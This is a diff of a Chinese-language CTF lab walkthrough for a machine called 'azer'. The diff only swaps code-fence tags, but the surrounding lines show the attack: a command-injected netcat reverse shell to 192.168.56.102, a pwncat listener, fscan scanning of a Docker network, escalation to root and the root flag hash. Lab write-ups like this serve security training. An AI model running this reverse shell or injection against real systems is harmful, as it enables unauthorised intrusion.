@@ -54,7 +54,7 @@ Error executing bash script: Command failed: /home/azer/get.sh a a fatal: not a 
 
 看到了疑似有脚本执行的部分，尝试执行命令注入执行反向 shell
 
-```shell
+```bash
 nc 192.168.56.102 9999 -e /bin/bash : nc 192.168.56.102 9999 -e /bin/bash
 ```
 
@@ -62,7 +62,7 @@ nc 192.168.56.102 9999 -e /bin/bash : nc 192.168.56.102 9999 -e /bin/bash
 
 ## User - azer
 
-```shell
+```bash
 ┌─[randark@parrot]─[~]
 └──╼ $ pwncat-cs -lp 9999
 [15:35:38] Welcome to pwncat 🐈!
@@ -159,7 +159,7 @@ vethf99cdf9: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
 
 直接借助 [shadow1ng/fscan: 一款内网综合扫描工具，方便一键自动化、全方位漏扫扫描。](https://github.com/shadow1ng/fscan) 对 Docker 网桥进行扫描
 
-```shell
+```bash
 (remote) azer@azer:/home/azer$ ./fscan -np -h 10.10.10.1/24
 
    ___                              _
@@ -178,7 +178,7 @@ start infoscan
 
 尝试访问
 
-```shell
+```bash
 (remote) azer@azer:/home/azer$ curl 10.10.10.10:80
 .:.AzerBulbul.:.
 ```
@@ -187,7 +187,7 @@ start infoscan
 
 ## User - root
 
-```shell
+```bash
 (remote) azer@azer:/home/azer$ su root
 Password:
 root@azer:/home/azer# whoami
@@ -196,7 +196,7 @@ root
 
 ### flag - root
 
-```shell
+```bash
 root@azer:~# cat root.txt
 b5d96aec2d5f1541c5e7910ccab527d8
 ```
